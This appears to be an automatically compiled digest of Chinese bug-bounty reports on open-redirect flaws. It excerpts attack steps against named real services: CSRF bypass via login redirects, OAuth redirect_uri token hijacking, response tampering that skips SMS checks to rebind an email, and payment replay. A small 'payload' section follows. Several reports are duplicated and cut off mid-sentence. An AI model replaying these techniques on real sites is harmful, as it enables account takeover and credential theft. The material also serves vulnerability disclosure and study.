# SRC 实战报告提炼 — open_redirect

> 来源：蚂蚁SRC榜一Clown的 16 份实战报告
> 提取时间：2026-09-14

## 典型案例摘要（16 份）

### csrf绕过

收藏店铺 1.随便点个店铺点收藏 2.抓包 3.绕过发现这个包是要检测referer的,但是可以用登陆业务来绕过 4.先url编码https%3a%2f%2xxxx%2fjsonp%2fcollectShop%2f1%3fcallback%3djQuery2110455627700315805_1573264921361%26shopId%3d1172u3gc%26_%3d1573264921363 5.添加到https://xxxx.com/user/newlogin?redirect_url=后面形成payload : https://xxxx/user/newlogin?redirect

### url重定向漏洞

url重定向漏洞 0x01漏洞原理                                  原理一 1.  Url重定向是程序员误信了攻击者的输入而将网站重定向到另一个站点，这通常通过url参数、HTML<meta>刷新标签、DOM中的window对象的location属性来实现的   很多Web 网站都是通过在原始 URL 的参数中设置目标 URL 来有意实现用户访问的重定向的。应用程序通过使用这个参数来告诉浏览器向目标 URL 发送一个GET请求，，例如，假定百度网站具有重定向到 Email 的功能，就可以通过访问如下URL 实现： https://www.baidu.com/?

### 北京值得买科技股份有限公司存在逻辑漏洞

漏洞连接：https://zhiyou.smzdm.com/user/ 漏洞点：个人中心，账号设置，修改邮箱 选择手机短信验证,下一步 开启抓包点下一步，验证码随便输入， 替换前： 替换如下响应包内容： 替换后 放包。 输入新的邮箱地址进行绑定。 即可绕过，修改的邮箱可用于登录，找回密码。 修改后邮箱：d**@xxxxx.cn 密码1234567 HTTP/1.1 200 OK Date: Mon, 07 Mar 2022 13:03:15 GMT Content-Type: text/html; charset=UTF-8 Connection: close Vary: Accept-Enc

### 漏洞挖掘之众测厂商 第三方登录RedirectUrl劫持漏洞

漏洞挖掘之众测厂商 第三方登录RedirectUrl劫持漏洞 0x00 前言 文章中的项目地址统一修改为: test.com 保护厂商也保护自己 0x01 前期准备 测试微博 测试微博账号：182******77 注：此微博已绑定厂商账号 测试厂商账号：182******77 注：测试微博绑定的就是此账号 0x02 攻击开始 官网: https://passport.test.com 攻击url: https://passport.test.com/Union/WeiBo?RedirectUrl=http://baidu.com   然后将此url发给受害者,受害者打开 劫持到的内容: htt

### 漏洞挖掘之众测厂商子站点组合漏洞劫持用户登录凭证

漏洞挖掘之众测厂商子站点组合漏洞劫持用户登录凭证 0x00 前言 文章中的项目地址统一修改为: test.com 保护厂商也保护自己 0x01 前期准备 测试微博 测试微博账号：182******77 注：此微博已绑定厂商账号 测试厂商账号：182******77 注：测试微博绑定的就是此账号 0x02 找一处其他站点url重定向漏洞 https://passport.test.com/account/login?redirectUrl=http://baidu.com 登录以后就会自动重定向了百度了 0x03 攻击开始 官网: https://passport.test.com 注意：此时受

### 漏洞挖掘之众测厂商 redirect_uri 授权劫持漏洞

漏洞挖掘之众测厂商 redirect_uri 授权劫持漏洞 0x00 前言 文章中的项目地址统一修改为: a.test.com 保护厂商也保护自己 0x01 概要 漏洞url:http://a.test.com:8087/oauthserver/? client_id=7D4A4A2C4B701548F97FA88C379447BA&state=1&response_type=code&redirect_uri=http://baidu. com redirect_uri 完全没验证导致可任意url获取token 0x02 请求包 0x02.1 请求包1： POST http://a.test

### 北京值得买科技股份有限公司存在逻辑漏洞

漏洞连接：https://zhiyou.smzdm.com/user/  漏洞点：个人中心，账号设置，修改邮箱      选择手机短信验证,下一步  fcmit.cc   开启抓包点下一步，验证码随便输入，    替换前：  fcmit.cc     替换如下响应包内容：  HTTP/1.1 200 OK  Date: Mon, 07 Mar 2022 13:03:15 GMT  Content-Type: text/html; charset=UTF-8  Connection: close  Vary: Accept-Encoding  Vary: Accept-Encoding  Var

### 北京值得买科技股份有限公司存在逻辑漏洞

漏洞连接：https://zhiyou.smzdm.com/user/  漏洞点：个人中心，账号设置，修改邮箱      选择手机短信验证,下一步  fcmit.cc   开启抓包点下一步，验证码随便输入，    替换前：  fcmit.cc     替换如下响应包内容：  HTTP/1.1 200 OK  Date: Mon, 07 Mar 2022 13:03:15 GMT  Content-Type: text/html; charset=UTF-8  Connection: close  Vary: Accept-Encoding  Vary: Accept-Encoding  Var

### 漏洞挖掘之众测厂商 第三方登录RedirectUrl劫持漏洞

漏洞挖掘之众测厂商 第三方登录RedirectUrl劫持漏洞 0x00 前言 文章中的项目地址统一修改为: test.com 保护厂商也保护自己 0x01 前期准备 测试微博 测试微博账号：182******77 注：此微博已绑定厂商账号 测试厂商账号：182******77 注：测试微博绑定的就是此账号 0x02 攻击开始 官网: https://passport.test.com 攻击url: https://passport.test.com/Union/WeiBo?RedirectUrl=http://baidu.com   然后将此url发给受害者,受害者打开 劫持到的内容: htt

### 漏洞挖掘之众测厂商子站点组合漏洞劫持用户登录凭证

漏洞挖掘之众测厂商子站点组合漏洞劫持用户登录凭证 0x00 前言 文章中的项目地址统一修改为: test.com 保护厂商也保护自己 0x01 前期准备 测试微博 测试微博账号：182******77 注：此微博已绑定厂商账号 测试厂商账号：182******77 注：测试微博绑定的就是此账号 0x02 找一处其他站点url重定向漏洞 https://passport.test.com/account/login?redirectUrl=http://baidu.com 登录以后就会自动重定向了百度了 0x03 攻击开始 官网: https://passport.test.com 注意：此时受

### 漏洞挖掘之众测厂商 redirect_uri 授权劫持漏洞

漏洞挖掘之众测厂商 redirect_uri 授权劫持漏洞 0x00 前言 文章中的项目地址统一修改为: a.test.com 保护厂商也保护自己 0x01 概要 漏洞url:http://a.test.com:8087/oauthserver/? client_id=7D4A4A2C4B701548F97FA88C379447BA&state=1&response_type=code&redirect_uri=http://baidu. com redirect_uri 完全没验证导致可任意url获取token 0x02 请求包 0x02.1 请求包1： POST http://a.test

### url重定向漏洞

url 重定向漏洞  0x01 漏洞原理                                   原理一  1.  Url 重定向是程序员误信了攻击者的输入而将网站重定向到另一个站点，这通常通过 url 参数、HTML<meta>刷新标签、DOM 中的 window 对象的 location 属性来实现的    很多 Web 网站都是通过在原始  URL 的参数中设置目标  URL 来有意实现用户访问的重 定向的。 应用程序通过使用这个参数来告诉浏览器向目标 URL 发送一个 GET 请求， ， 例如， 假定百度网站具有重定向到 Email 的功能，就可以通过访问如下 URL 实现

### 北京值得买科技股份有限公司存在逻辑漏洞

漏洞连接：https://zhiyou.smzdm.com/user/  漏洞点：个人中心，账号设置，修改邮箱      选择手机短信验证,下一步  fcmit.cc   开启抓包点下一步，验证码随便输入，    替换前：  fcmit.cc     替换如下响应包内容：  HTTP/1.1 200 OK  Date: Mon, 07 Mar 2022 13:03:15 GMT  Content-Type: text/html; charset=UTF-8  Connection: close  Vary: Accept-Encoding  Vary: Accept-Encoding  Var

### 某厂家文库活动存在支付漏洞

漏洞 url：  https://xxxxxxxx/     仅限一次购买（表面上）  抓包看，发现生成订单路径    这是订单路径：https://xxxxxxx/qrbe/19YU9qM    付款后会自动签约自动续费，先取消自动续费  fcmit.cc   查看 vip 到期时间，现在是 2022-04-12    将上述数据包发送到 burp 的 repeater 模 块 ， 重 放 数 据 包 得 到 另 外 一 个 支 付 地 址 （https://xxxxx/qrbe/19YUFpN）    fcmit.cc 用手机打开该支付路径    依然能支付成功      并且 vip 天

### 有道精品课堂支付处生成二维码存在任意URL跳转

有道精品课堂支付处生成二维码存在任意URL跳转 漏洞类型:逻辑漏洞 漏洞等级(自评): 低危 漏洞URL: https://ke.youdao.com/user/order/ 漏洞概述: 	在有道精品课堂购买一门课程,但是不支付,退出界面,访问我的订单,点击继续支付会生成一个二维码,可以通过抓包更改二维码的内容.二维码可以改成任意URL,造成任意URL跳转. 漏洞复现: 	首先访问有道精品课堂的主页,随便选一门课订购,但是不支付退出支付界面,然后访问URL: https://ke.youdao.com/user/order/ 点击继续支付,并开启burp suite进行数据包截获 在这个URL

### 转转漏洞挖掘从无到有的副本

挖啊挖 没发现什么漏洞 挖不动啊 发现一处CORS也被限制死域名了 然后有一处api引起了我的注意 这个api是返回订单信息的  https://api.*******.com/api/order/getSellerOrder 有着不少的敏感信息 想着能不能获取到这个数据呢 明显的有CORS但是被限制死了域名 返回的是json格式数据也不是jsonp 那开发人员会不会有种习惯 设计api的时候提供json和jsonp两种格式 而jsonp的函数名变量名就是callback 加多个参数 callback=hijacking试试看  果真变成jsonp了 既然如此 那么别的敏感接口是否也存在这种问

## 实战 Payload 集（2 条去重）

### XSS

```
ontent="0;
```

### HTTP请求

```
GET /?ST=NjgyZWE3ZjEtZTY4My00Yjc5LTkzZDQtN2M1NTNhZjFkYjlm HTTP/1.1
Host: baidu.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 
Safari/537.36
DNT: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: cookie不能给你哦~
Connection: close
```

## 技术手法统计

- 漏洞利用: 2 次
- 漏洞链: 2 次
- WAF/过滤绕过: 1 次
- 提权: 1 次

